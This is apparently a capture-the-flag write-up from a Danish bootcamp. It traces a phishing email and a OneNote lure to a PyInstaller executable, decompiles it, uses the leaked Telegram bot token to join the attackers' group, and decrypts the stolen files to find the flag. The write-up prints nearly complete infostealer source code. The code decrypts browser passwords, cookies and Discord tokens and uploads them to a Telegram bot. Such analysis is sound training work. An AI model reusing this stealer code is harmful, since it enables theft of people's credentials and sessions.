# Writeup

* Download the msg file and open in an e-mail viewer like Outlook:

```
AWESOME OFFER, FREE PEPSI MAX JUST FOR YOU!

TO REDEEM YOU OFFER, FOLLOW THESE STEPS NOW!
1.	OPEN ATTACHED FILE
2.	DOUBLE-CLICK LINK IN FILE
3.	???
4.	PROFIT
ONLY VALID FOR 10 MORE MINUTES!!!

/Pepsi Max
```

* Download the OneNote attachment `FREE PEPSI MAX, $0, ACT QUICK!.one` and open:

```
CLICK ON LINK BELOW TO REDEEM YOUR OFFER!
ACT NOW, OFFER IS VALID FOR 10 MORE MINUTES!!!

free_pepsi.exe
```

* Download the EXE-file and inspect its strings - lots of Python references, so likely a PyInstaller EXE
* Use `pyinstxtractor` from https://github.com/extremecoders-re/pyinstxtractor to extract the original pyc files
* Use a decompiler like `pycdc` from https://github.com/zrax/pycdc on `main.pyc` to recover the original source code

```py
import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect

import win32crypt
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

local = "COMMENTED OUT SO YOU DON'T ACCIDENTALLY EXFILTRATE YOUR OWN DATA :sip:" # os.getenv('LOCALAPPDATA')
roaming = "COMMENTED OUT SO YOU DON'T ACCIDENTALLY EXFILTRATE YOUR OWN DATA :sip:" # os.getenv('APPDATA')

username = os.getlogin()

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

fileCookies = "cooks_" + username + ".txt"
filePass = "passes_" + username + ".txt"

public_key = RSA.importKey("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1jwo0sjznck8tGmCDMc5
/xXBC1FhQaxV9HMkz64ZDCJ41Zc1Rie6G7A54VRgZ+e8AmyMIdssnja2Eu/JFtaM
Qw8gPMNtIkYWdc8LdnVzsCzL4sL7J+M4zC9qKpWbxIMDvv9T5QjXIcQaDucEMGUZ
YIOxMU1aEBtg+T6D+2nLH1pNs5t23MZr8G7w6W1yhd8NQNEfPYQ3gvjN2qxHDMtt
EWWIm5pcoRyZGXHv/RW71sR2+i8Rkv17kgoxcDSkXRrDKFNQPFKHl1ZXyvic3OYH
OjIFQ+JX5/9KeJEoJi0vYFZnY2zD0Cml3Dxkgpv0J6aWwQ1Bapk/ZbZi3rcLr/Pf
MwIDAQAB
-----END PUBLIC KEY-----""")
cipher_rsa = PKCS1_OAEP.new(public_key)


# DISCORD TOKENS
def decrypt_token(buff, master_key):
    try:
        return AES.new(
            win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1],
            AES.MODE_GCM,
            buff[3:15]
        ).decrypt(buff[15:])[:-16].decode()
    except:
        pass


# DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


# DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            with connect("TempMan.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        ######################################################################
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass


def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"


def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)


def send_info():
    requests.post(
        'https://api.telegram.org/bot5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4/sendMessage',
        data={'chat_id': '-1001855149018', 'text': f'Script executed at target "{username}", exfiltrating data...'}
    )


def upload(file):
    # Encryption based on docs: https://pycryptodome.readthedocs.io/en/latest/src/examples.html#encrypt-data-with-rsa
    session_key = get_random_bytes(16)
    enc_session_key = cipher_rsa.encrypt(session_key)
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(open(file, "rb").read())

    with open(file, "w") as f:
        f.write(enc_session_key.hex() + "\n")
        f.write(cipher_aes.nonce.hex() + "\n")
        f.write(tag.hex() + "\n")
        f.write(ciphertext.hex() + "\n")

    requests.post(
        'https://api.telegram.org/bot5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4/sendDocument',
        data={'chat_id': '-1001855149018'},
        files={'document': open(file, 'rb')}
    )


for_handler = (
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)


def file_handler(file):
    if os.path.exists(file):
        if ".txt" in file:
            upload(file)
        os.remove(file)


def main():
    send_info()

    # CHROME PROFILES
    for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
        if i.startswith("Profile "):
            browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"

    for name, path in browser_loc.items():
        print(path, name)
        decrypt_files(path, name)
    for i in for_handler:
        file_handler(i)


if __name__ == "__main__":
    main()
```

* This is a modified version of this ChromiumStealer script: https://github.com/ksdodk/ChromiumStealer
* The script recovers most browser passwords and cookies from the computer it is run on and sends it to a Telegram group using a bot
* Importantly, we see an RSA public key, a Telegram bot token `5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4`, and a `chat_id` `-1001855149018`
* Knowing these, we have the same access on the group the bot has, which lets us infiltrate the server in a few ways
* The intended solution was to use the API endpoint `createChatInviteLink`. You get an invite link by simply visiting:

```
https://api.telegram.org/bot5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4/createChatInviteLink?chat_id=-1001855149018
```

You will get a JSON-response like the following:

```json
{"ok":true,"result":{"invite_link":"https://t.me/+XzSBTLBHxkEzMDhk","creator":{"id":5922953099,"is_bot":true,"first_name":"Info-Stealer","username":"DDC_info_stealer_bot"},"creates_join_request":false,"is_primary":false,"is_revoked":false}}
```

* The bot is apparently called `Info-Stealer` and has username `DDC_info_stealer_bot`. We now also have an invite link and can join the Telegram group
* We see it is called `B00tc4mp 1nf1l7r4t0r5` and has one admin except the bot: `H4ck3r N1zz3n` with username `@DDC_h4ck3rm4n`
* Below is the chat log up until participants started joining:

```
H4ck3r N1zz3n, [10-06-2023 12:58]
Alright, the goal is clear: we have some of the best Danish hackers all together in one spot rn

H4ck3r N1zz3n, [10-06-2023 12:59]
All eager to get flags, super easy targets - should be very easy to social engineer them to run malware locally

H4ck3r N1zz3n, [10-06-2023 13:01]
I have thrown together a data exfiltration script that will grab their browser passwords and cookies and Discord tokens

H4ck3r N1zz3n, [10-06-2023 13:02]
Running a few tests in a moment

Hacker Hotdog Elsker, [10-06-2023 13:03]
Im almost in, I have soon hacked into the Steff Houlberg Corporate database and gotten their pølse opskrift

Hacker Hotdog Elsker, [10-06-2023 13:04]
Please don’t hackeroni it from me

H4ck3r N1zz3n, [10-06-2023 13:05]
Definitely a secondary goal here, but sounds awesome!!!

Adam, [10-06-2023 15:02]
Monkas

H4ck3r N1zz3n, [10-06-2023 15:02]
hyyype!

Adam, [10-06-2023 15:02]
So many powerful hackers

Adam, [10-06-2023 15:02]
Very scary

Adam, [10-06-2023 15:02]
So we just send them the binary

Adam, [10-06-2023 15:02]
Then they run it

H4ck3r N1zz3n, [10-06-2023 15:02]
Super scary, very scared of that fireturkey guy

Adam, [10-06-2023 15:02]
And it dumps all their data?

H4ck3r N1zz3n, [10-06-2023 15:03]
More or less yeah, we have all their emails, so we can try phishing?

Adam, [10-06-2023 15:03]
We should be able to sell this to team germany for a nice amount of wienerschnitzel

H4ck3r N1zz3n, [10-06-2023 15:03]
Trueeee, and currywurst!

H4ck3r N1zz3n, [10-06-2023 15:05]
Just added a layer of encryption to the exfiltrated data, here's the private key, so we can decrypt later
ATTACHMENT: exfiltration_key

Hacker Hotdog Elsker, [10-06-2023 15:06]
01010101111001010110001111101010101

H4ck3r N1zz3n, [10-06-2023 15:07]
Who should we attack first? Nationals winners/top 3 are obvious choices ofc

H4ck3r N1zz3n, [10-06-2023 15:12]
Is this base64?

Hacker Hotdog Elsker, [10-06-2023 15:23]
If we get caught call 0118 999 881 999 119 725 3

Info-Stealer, [10-06-2023 15:50]
Script executed at target "sebastianpc", exfiltrating data...

Info-Stealer, [10-06-2023 15:50]
ATTACHMENT: passes_sebastianpc.txt

Info-Stealer, [10-06-2023 15:50]
ATTACHMENT: cooks_sebastianpc.txt

H4ck3r N1zz3n, [10-06-2023 15:51]
Yooo, got one on the hook!

H4ck3r N1zz3n, [10-06-2023 15:51]
Whoops, forgot to enable encryption for that one - enabling now...

H4ck3r N1zz3n, [10-06-2023 15:53]
Their trainers might have some really juicy stuff actually, think I'll try spear phishing Jens Myrup

H4ck3r N1zz3n, [10-06-2023 15:55]
GIF: Supereasy, barely an inconvenience

H4ck3r N1zz3n, [10-06-2023 16:44]
I think we are ready to deploy the entire phishing campaign and get the rest of their creds - operation starts 20:00

H4ck3r N1zz3n, [10-06-2023 16:45]
GIF: Oooh can't wait

Hacker Hotdog Elsker, [10-06-2023 16:48]
Wait isn’t hacking illegal? Are you sure we should do this, even though we get ALL the treasures

H4ck3r N1zz3n, [10-06-2023 16:48]
Bro, not now

Hacker Hotdog Elsker, [10-06-2023 16:51]
It’s too late? 😱😱😱

Hacker Hotdog Elsker, [10-06-2023 16:51]
Right time to be h8x0r. Deploying my auto bot transformers metasploit encoded antivirus bypassing calc.exe payload

H4ck3r N1zz3n, [10-06-2023 16:52]
Yeah, I already sent the spearphishing mail to Jens, just waiting now

Hacker Hotdog Elsker, [10-06-2023 16:52]
Once we have the encrypted credentials I’ll use my quantum computer to crack those base64 encoded hashes

H4ck3r N1zz3n, [10-06-2023 16:53]
What on earth are you talking about, we are encrypting them ourselves??? I literally already sent the key

Hacker Hotdog Elsker, [10-06-2023 16:53]
Btw have you heard of the tool called tracer t? It can be used to leak Jen’s IP if you know he is accessing Google.com at that time

H4ck3r N1zz3n, [10-06-2023 16:53]
These guys...

Info-Stealer, [10-06-2023 16:53]
Script executed at target "Jens", exfiltrating data...

Info-Stealer, [10-06-2023 16:53]
ATTACHMENT: passes_jens.txt

Info-Stealer, [10-06-2023 16:53]
ATTACHMENT: cooks_jens.txt

H4ck3r N1zz3n, [10-06-2023 16:53]
YOOOOOO

H4ck3r N1zz3n, [10-06-2023 16:53]
There we go! We got Jens!!!

H4ck3r N1zz3n, [10-06-2023 16:54]
WHAT that sounds amazing!

Hacker Hotdog Elsker, [10-06-2023 16:54]
https://youtu.be/dQw4w9WgXcQ this video explains it in detail

Hacker Hotdog Elsker, [10-06-2023 16:55]
Wait crap wrong link

H4ck3r N1zz3n, [10-06-2023 16:55]
Maybe this??? https://www.youtube.com/watch?v=SXmv8quf_xM

H4ck3r N1zz3n, [10-06-2023 16:55]
This is who we all aspire to be like some day!

Hacker Hotdog Elsker, [10-06-2023 16:55]
Yes that’s the one!

H4ck3r N1zz3n, [10-06-2023 18:16]
Ready for the big operation???
```

* We get here a lot of info about the operation, seemingly about exfiltrating data from bootcamp participants because they will be easy targets - just offer free flags!
* Importantly, we see an example exfiltration from one of the participants (unencrypted), from the trainer Jens (encrypted), and a private exfiltration key file
* We don't find anything of value in the first set of exfiltrated files, so we have to decrypt the second
* To decrypt, we look at the encryption code from the main script - in particular we see a helpful comment on the implementation:

```py
# Encryption based on docs: https://pycryptodome.readthedocs.io/en/latest/src/examples.html#encrypt-data-with-rsa
```

* Visiting this, we more or less get the exact decryption code needed - the following script decrypts an input file:

```py
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

private_key = RSA.import_key(open("exfiltration_key").read())
cipher_rsa = PKCS1_OAEP.new(private_key)

with open("passes_Jens.txt") as f:
    sk, n, t, ct = f.read().split()

enc_session_key = bytes.fromhex(sk)
nonce = bytes.fromhex(n)
tag = bytes.fromhex(t)
ciphertext = bytes.fromhex(ct)

session_key = cipher_rsa.decrypt(enc_session_key)
cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
data = cipher_aes.decrypt_and_verify(ciphertext, tag)

print(data.decode())
```

This outputs

```
*** Chrome ***
*** Brave ***
URL : https://vbn.aau.dk/
Name: jens@myrup.ctf
Pass: ForskerJensIsBackAndMoreSecureThanEver1337!!!

URL : https://reddit.com/
Name: jens@myrup.ctf
Pass: RedditIsWhereIFindMySecretMaliciousHacksForMyResearch

*** Edge ***
URL : https://dk.ecsc-strategy.ctf/
Name: JensMyrupECSC
Pass: bootcamp{h4ck3rs_w1ll_run_4nyth1ng_l0c4lly_f0r_fl4gs}
```

and we see that Jens has stored a quite interesting password in the Edge browser for the site `https://dk.ecsc-strategy.ctf/`.


## Flag

`bootcamp{h4ck3rs_w1ll_run_4nyth1ng_l0c4lly_f0r_fl4gs}`
